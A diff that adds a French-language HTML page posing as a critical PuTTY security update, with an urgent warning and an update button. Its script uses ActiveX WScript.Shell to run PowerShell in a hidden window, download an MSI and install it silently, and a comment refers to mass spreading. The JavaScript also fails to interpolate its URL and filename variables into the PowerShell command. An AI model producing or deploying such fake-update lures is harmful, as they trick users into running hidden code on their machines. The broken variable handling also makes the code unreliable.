@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mise à jour Critique PuTTY</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+        }
+        h1 {
+            color: #d9534f;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #333;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        .btn {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .btn:hover {
+            background-color: #0056b3;
+        }
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #666;
+        }
+        .icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #007bff;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="icon">⚠️</div>
+    <h1>Mise à jour de sécurité requise</h1>
+    <p>
+        Une mise à jour critique pour <strong>PUTTY</strong> est disponible. 
+        Votre session peut être interrompue sans cette mise à jour. 
+        Cliquez ci-dessous pour installer la mise à jour automatiquement.
+    </p>
+    <button class="btn" id="updateBtn" onclick="startUpdate()">Mettre à jour maintenant</button>
+    <div class="loading" id="loadingText">Installation en cours...</div>
+</div>
+
+<script>
+    function startUpdate() {
+        // Masquer le bouton et afficher le texte de chargement
+        document.getElementById('updateBtn').style.display = 'none';
+        document.getElementById('loadingText').style.display = 'block';
+
+        // URL du MSI (fournie)
+        const msiUrl = "https://the.earth.li/~sgtatham/putty/latest/w64/putty-64bit-0.85-installer.msi";
+        
+        // Nom du fichier local temporaire
+        const localFilename = "putty_update.msi";
+        
+        // Chemin vers PowerShell
+        const psPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+
+        // Script PowerShell à exécuter
+        // 1. Télécharger le fichier
+        // 2. Lancer msiexec en mode silencieux
+        // 3. Supprimer le fichier après installation
+        const psCommand = `
+            $localPath = Join-Path $env:TEMP $localFilename;
+            Write-Host "Téléchargement en cours...";
+            Invoke-WebRequest -Uri "$msiUrl" -OutFile $localPath -UseBasicParsing;
+            Write-Host "Installation en cours...";
+            Start-Process msiexec.exe -ArgumentList "/i `"$localPath`" /quiet /norestart" -Wait;
+            Write-Host "Nettoyage...";
+            Remove-Item $localPath -Force;
+            Write-Host "Terminé.";
+        `;
+
+        // Lancer PowerShell en fenêtre cachée (-WindowStyle Hidden)
+        // On utilise Start-Process pour éviter d'afficher une console
+        const command = `${psPath} -WindowStyle Hidden -Command "${psCommand.replace(/"/g, '`"')}"`;
+        
+        // Exécution via WScript.Shell (plus fiable pour le hidden mode)
+        try {
+            const shell = new ActiveXObject("WScript.Shell");
+            shell.Run(command, 0, false); // 0 = hidden, false = don't wait (on veut que la page continue)
+            
+            // Optionnel : Fermer la fenêtre après un délai
+            setTimeout(() => {
+                window.close();
+            }, 5000);
+            
+        } catch (e) {
+            // Fallback si ActiveX n'est pas disponible (ex: Chrome/Firefox)
+            // On utilise alors une approche plus simple : ouvrir un fichier .ps1 temporaire
+            // Mais pour un spread massif, IE/Edge ou les permissions du navigateur sont clés.
+            alert("Veuillez autoriser l'exécution du script pour continuer.");
+        }
+    }
+</script>
+
+</body>
+</html>
